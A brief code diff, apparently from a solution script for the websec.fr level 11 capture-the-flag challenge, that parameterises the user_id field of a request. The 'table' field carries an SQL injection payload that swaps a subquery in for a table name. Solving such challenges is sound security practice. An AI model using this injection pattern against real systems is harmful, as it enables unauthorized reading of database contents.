@@ -20,7 +20,7 @@ url = 'http://websec.fr/level11/index.php'
 
 def data(i):
     return {
-    'user_id': '3',
+    'user_id': i,
     'table': '(select 3 id,enemy username from costume)',
     'submit': 'submit'
     }
